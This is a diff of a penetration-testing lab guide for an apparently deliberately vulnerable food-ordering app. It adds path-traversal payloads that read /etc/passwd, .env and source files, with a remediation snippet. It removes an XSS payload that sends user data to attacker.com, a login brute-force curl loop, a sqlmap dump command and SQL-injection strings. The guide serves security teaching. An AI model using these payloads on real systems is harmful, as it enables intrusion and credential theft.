+  const response = await fetch(req.body.url);
+  res.send(await response.text());
+});
+```
+
+#### 8. Local File Inclusion (LFI)
+**Location**: `GET /api/view-document?file=...`  
+**Impact**: Source code disclosure, configuration file access, credential theft  
+**OWASP**: A01:2021 - Broken Access Control
+
+**How to Test:**
+
+**Step 1: Test Basic File Access**
+
+1. Login to the application
+2. Try accessing a legitimate document:
+```
+http://<TARGETIP>:5000/api/view-document?file=invoice.pdf
+```
+
+**Step 2: Directory Traversal - Read System Files**
+
+Try these payloads in your browser or using curl:
+
 ```bash
-# Attempt 100 login requests (no rate limiting!)
-for i in {1..100}; do
-  curl -X POST http://<TARGETIP>:5000/api/login \
-    -H "Content-Type: application/json" \
-    -d '{"username":"admin","password":"test'$i'"}' \
-    -s -o /dev/null -w "%{http_code}\n"
-done
+# Linux/Unix system files (use absolute paths)
+http://<TARGETIP>:5000/api/view-document?file=/etc/passwd
+http://<TARGETIP>:5000/api/view-document?file=/etc/hosts
 ```
 
----
+These payloads are dangerous because they exploit a vulnerability known as Directory Traversal (also called Path Traversal) to access and read sensitive system files on the targeted server.
 
-### 7. Firefox Developer Tools (Built-in)
+/etc/passwd: This file contains a list of all user accounts on the system. While it doesn't contain the password hashes (those are in /etc/shadow), it reveals usernames, User IDs (UID), Group IDs (GID), home directory paths, and the default shell for every user. This information is invaluable for an attacker planning further attacks like privilege escalation.
 
-**How to Open**: Press **F12** or right-click → "Inspect"
+/etc/hosts: This file contains mappings of hostnames to IP addresses for a machine. It reveals information about the server's network configuration and other internal servers or services the machine communicates with. This is crucial for internal network mapping and identifying secondary targets.
 
-**Purpose**: Client-side testing, JavaScript analysis, network inspection  
-**Best for**: XSS testing, session analysis, exposed secrets
+By successfully running these payloads, an attacker achieves unauthorised information disclosure, gaining critical intelligence about the server's configuration and user base without needing a valid account or specific permissions, marking a severe compromise of security.
 
-**Firefox DevTools Tabs:**
-- **Inspector**: View and edit HTML/CSS (like Chrome's Elements)
-- **Console**: Execute JavaScript, view errors and logs
-- **Debugger**: View JavaScript source files (like Chrome's Sources)
-- **Network**: Monitor HTTP requests and responses
-- **Storage**: View cookies, localStorage, sessionStorage (like Chrome's Application)
 
-**Manchester Fresh Foods Examples:**
+**Step 3: Read Application Source Code**
 
-**Test 1: Stored XSS**
-```
-1. Navigate to /dashboard/profile in Firefox
-2. Press F12 to open Developer Tools
-3. In the bio field, enter this payload:
-   <img src=x onerror=alert('XSS')>
-4. Save the profile
-5. Refresh the page - observe the XSS alert!
+```bash
+# Read server code (relative paths from application root)
+http://<TARGETIP>:5000/api/view-document?file=server/index.ts
+http://<TARGETIP>:5000/api/view-document?file=server/routes.ts
+http://<TARGETIP>:5000/api/view-document?file=server/database.ts
 
-More dangerous payload (credential theft):
-<script>
-  fetch('/api/user').then(r=>r.json()).then(u=>
-    fetch('https://attacker.com/steal?data='+JSON.stringify(u))
-  )
-</script>
+# Read configuration files
+http://<TARGETIP>:5000/api/view-document?file=package.json
+http://<TARGETIP>:5000/api/view-document?file=.env
 ```
 
-**Test 2: Session Cookie Analysis**
-```
-1. Press F12 to open Firefox Developer Tools
-2. Go to the Storage tab
-3. Expand Cookies → http://<TARGETIP>:5000
-4. Find the connect.sid cookie
-5. Check for security issues:
-   ❌ Missing HttpOnly flag (allows JavaScript access)
-   ❌ Missing Secure flag (sent over HTTP)
-   ❌ Missing SameSite attribute (CSRF vulnerable)
-   ❌ Predictable session ID pattern (sess_1000_timestamp)
+**Another option: Using curl for Automation**
 
-Alternative - Console tab:
-document.cookie  // If HttpOnly is missing, cookie is visible here!
+```bash
+# Test LFI - Read system files
+curl "http://<TARGETIP>:5000/api/view-document?file=/etc/passwd"
+
+# Read application source code
+curl "http://<TARGETIP>:5000/api/view-document?file=server/routes.ts"
+
+# Read package.json
+curl "http://<TARGETIP>:5000/api/view-document?file=package.json"
 ```
 
-**Test 3: Exposed Secrets in Source Code**
-```
-1. Press F12 to open Firefox Developer Tools
-2. Go to the Debugger tab
-3. Press Ctrl+Shift+F to open "Search in all files"
-4. Search for sensitive keywords:
-   - "api_key"
-   - "secret"
-   - "password"
-   - "token"
-   - "SESSION_SECRET"
-5. Check for exposed credentials in JavaScript bundles
-```
+**Note**: This endpoint doesn't require authentication!
 
-**Test 4: IDOR via Console**
+**Another option: Using Firefox Developer Tools**
+
+1. Press **F12** and go to **Console** tab
+2. Execute:
 ```javascript
-// Press F12, go to Console tab
-// Paste and run these commands:
-
-// Get another user's order (replace UUID with one captured earlier)
-fetch('/api/orders/UUID_FROM_OTHER_USER')
+fetch('/api/view-document?file=/etc/passwd')
   .then(r => r.json())
-  .then(data => console.log('STOLEN ORDER:', data))
+  .then(data => console.log(data.content))
 
-// Get another user's profile  
-fetch('/api/profile/DIFFERENT_USER_ID')
+fetch('/api/view-document?file=server/routes.ts')
   .then(r => r.json())
-  .then(data => console.log('STOLEN PROFILE:', data))
+  .then(data => console.log('Source code:', data.content))
 ```
 
-**Test 5: Network Tab Analysis**
-```
-1. Press F12, go to Network tab
-2. Navigate around the application
-3. Look for:
-   - API endpoints being called (filter by XHR)
-   - Sensitive data in responses
-   - Session tokens in headers
-   - Unencrypted data transmission
-4. Right-click any request → "Edit and Resend" to modify and replay
-```
+**Expected Result:**
+✅ **Vulnerability Confirmed**: You can read arbitrary files from the server
 
----
+**What You Can Access:**
+- `/etc/passwd` - User accounts
+- `/etc/hosts` - Network configuration
+- `server/routes.ts` - Application source code revealing all vulnerabilities
+- `server/index.ts` - Server configuration
+- `package.json` - Dependencies and scripts
+- `.env` files with secrets (if they exist)
 
-### 8. Postman / Insomnia - API Testing
+**Why This is Dangerous:**
+- **Source code disclosure**: Reveals other vulnerabilities
+- **Credential theft**: Database passwords, API keys
+- **System reconnaissance**: User accounts, installed software
+- **Privilege escalation**: Information for further attacks
 
-**Purpose**: Structured API testing, collection building  
-**Best for**: Testing authenticated endpoints, building attack workflows
+**Remediation:**
+```typescript
+// ❌ VULNERABLE: Direct file path
+app.get('/api/view-document', (req, res) => {
+  const filePath = req.query.file;
+  res.sendFile(filePath);
+});
 
-**Manchester Fresh Foods Collection:**
+// ✅ SECURE: Whitelist and path validation
+import path from 'path';
+const ALLOWED_DIR = '/var/www/documents';
+const ALLOWED_FILES = ['invoice.pdf', 'terms.pdf', 'privacy.pdf'];
 
-Create a Postman collection with these requests:
-
-```
-1. Login (POST /api/login)
-   - Save session cookie automatically
-   
-2. Get Current User (GET /api/user)
-   - Uses saved session
-   
-3. Get Orders (GET /api/orders)
-   - Test IDOR by manually changing order IDs
-   
-4. Search Products (GET /api/products/search?query=')
-   - SQL injection payloads in query parameter
-   
-5. Update Profile (POST /api/profile)
-   - XSS payloads in bio field
-```
-
----
-
-## Tool Recommendation Matrix
-
-Match each vulnerability to the best testing tool:
-
-| Vulnerability | Primary Tool | Alternative Tools |
-|--------------|--------------|-------------------|
-| **SQL Injection** | SQLmap, Burp Intruder | curl, ZAP, Manual (DevTools) |
-| **Stored XSS** | Firefox Developer Tools, Burp | ZAP, Manual testing |
-| **IDOR** | Burp Repeater, curl | Postman, DevTools Console |
-| **Weak Passwords** | Burp Intruder, Hydra | Custom Python script |
-| **Session Hijacking** | Cookie Editor, Burp | EditThisCookie, curl |
-| **CSRF** | Burp, Custom HTML form | curl, Postman |
-| **Rate Limiting** | Burp Intruder | curl loop, Python script |
-| **SSRF** | curl, Burp Repeater | Postman |
-| **LFI** | curl, Browser | Burp Repeater |
-| **XXE** | Burp Repeater, curl | Postman |
-| **Info Disclosure** | Nikto, curl | Browser, ZAP Spider |
-| **Plaintext Passwords** | SQLmap (dump users) | Burp (observe responses) |
-| **Predictable Sessions** | Burp Sequencer | Cookie Editor + manual |
-| **Verbose Errors** | ZAP, Nikto | Any tool (trigger errors) |
-| **Exposed Secrets** | Firefox Developer Tools Debugger | grep source files |
-
----
-
-## Complete Penetration Testing Workflow
-
-Follow this methodology to systematically test Manchester Fresh Foods:
-
-### Phase 1: Reconnaissance (30 minutes)
-
-**Goal**: Map the application and identify attack surface
-
-```bash
-# 1. Technology detection
-# Open application in browser with Wappalyzer enabled
-
-# 2. Spider the application
-nikto -h http://<TARGETIP>:5000
-
-# 3. Manual exploration
-# - Browse all public pages (/, /products, /contact, /login, /register)
-# - Login and explore authenticated pages
-# - Note all forms, inputs, and API endpoints
-
-# 4. Intercept traffic with Burp/ZAP
-# - Enable proxy
-# - Click through entire application
-# - Review Site Map in Burp to see all endpoints discovered
+app.get('/api/view-document', (req, res) => {
+  const filename = path.basename(req.query.file); // Remove path
+  
+  if (!ALLOWED_FILES.includes(filename)) {
+    return res.status(403).json({ error: 'File not allowed' });
+  }
+  
+  const safePath = path.join(ALLOWED_DIR, filename);
+  
+  // Ensure path is within allowed directory
+  if (!safePath.startsWith(ALLOWED_DIR)) {
+    return res.status(403).json({ error: 'Invalid path' });
+  }
+  
+  res.sendFile(safePath);
+});
 ```
 
-**Expected Endpoints Discovered:**
-```
-Public:
-- GET  /
-- GET  /products
-- GET  /contact
-- GET  /login
-- GET  /register
-- GET  /instructor
-- GET  /api/products
-- GET  /api/products/search?query=
-- POST /api/login
-- POST /api/register
-- POST /api/contact
-
-Authenticated (Customer):
-- GET  /dashboard
-- GET  /dashboard/orders
-- GET  /dashboard/place-order
-- GET  /dashboard/invoices
-- GET  /dashboard/profile
-- GET  /api/user
-- GET  /api/orders
-- GET  /api/orders/:id
-- POST /api/orders
-- POST /api/profile
-
-Admin:
-- All customer endpoints plus full order visibility
-```
-
----
-
-### Phase 2: Automated Scanning (45 minutes)
-
-**Goal**: Let tools find low-hanging fruit
-
-```bash
-# 1. ZAP Automated Scan
-# Run full automated scan while you work on manual tests
-
-# 2. SQLmap against login
-sqlmap -r login-request.txt --batch --dbms=SQLite --dump-all
-
-# 3. Nikto full scan
-nikto -h http://<TARGETIP>:5000 -Tuning x -o nikto-report.html -Format html
-```
-
-**Review automated findings and prioritize manual verification**
-
----
-
-### Phase 3: Manual Exploitation (2-3 hours)
-
-**Test each vulnerability systematically:**
-
-**1. Authentication (30 min)**
-- [ ] SQL injection in login (`' OR '1'='1' --`)
-- [ ] Default credentials (`admin/admin123`)
-- [ ] Weak password policy (register with `a`)
-- [ ] Session predictability (login/logout 5x, analyze pattern)
-
-**2. Authorization (30 min)**
-- [ ] IDOR in orders (access other customer orders)
-- [ ] IDOR in profiles (view/edit other user profiles)
-- [ ] Admin functions accessible to customers
-
-**3. Injection Attacks (45 min)**
-- [ ] SQL injection in product search
-- [ ] Stored XSS in profile bio
-- [ ] Stored XSS in order notes
-- [ ] Stored XSS in contact form
-- [ ] XXE in order import (if implemented)
-
-**4. Information Disclosure (20 min)**
-- [ ] Verbose error messages (trigger errors)
-- [ ] Exposed secrets in JS source
-- [ ] Directory traversal attempts
-- [ ] Database credential exposure
-
-**5. Session Management (20 min)**
-- [ ] Cookie analysis (missing flags)
-- [ ] Session fixation
-- [ ] Session hijacking via predictable IDs
-
-**6. Security Controls (20 min)**
-- [ ] CSRF (create external form)
-- [ ] Rate limiting (100 login attempts)
-- [ ] SSRF (if /api/fetch-document exists)
-- [ ] LFI (if /api/view-document exists)
-
----
-
-### Phase 4: Documentation (1-2 hours)
-
-For each vulnerability found:
-
-1. **Take screenshots** showing the exploit
-2. **Save HTTP requests/responses** from Burp
-3. **Document exact reproduction steps**
-4. **Assess real-world impact**
-5. **Provide remediation recommendations**
-
-**Deliverable**: Professional penetration test report with:
-- Executive summary
-- Methodology
-- Findings (Critical → Low severity)
-- Evidence for each finding
-- Remediation roadmap
-
----
-
-## Professional Reporting
-
-When documenting vulnerabilities, include:
-
-1. **Vulnerability Title** (e.g., "IDOR in Order Viewing")
-2. **Severity Rating** (Critical/High/Medium/Low)
-3. **Description** - What the vulnerability is
-4. **Steps to Reproduce** - Detailed instructions
-5. **Evidence** - Screenshots, HTTP requests/responses
-6. **Impact** - What an attacker could do
-7. **Remediation** - How to fix it
-8. **CVSS Score** (if applicable)
-9. **OWASP Top 10 Reference** (e.g., A01:2021 - Broken Access Control)
-
----
-
-## Ethical Guidelines
-
-✅ **DO**:
-- Test only this deliberately vulnerable application
-- Document findings systematically
-- Learn the impact of each vulnerability
-- Understand proper remediation techniques
-- Practice responsible disclosure principles
-
-❌ **DON'T**:
-- Test real websites without authorisation
-- Share these techniques for malicious purposes
-- Deploy this vulnerable code to production
-- Use customer data outside this educational context
-
----
-
-## Need Help?
-
-**Instructor Documentation**: Navigate to `/instructor` and enter password `penetration-test-2024` for complete vulnerability details and testing hints.
-
-**Stuck on a vulnerability?**: The instructor docs provide:
-- All 15 vulnerability locations
-- Specific testing techniques
-- Tool recommendations
-- Expected impacts
-- Exploitation examples
-
----
-
-Happy ethical hacking! 🛡️
+#### Now, go on to look at the medium severities markdown document (`ADDITIONAL2.md`)
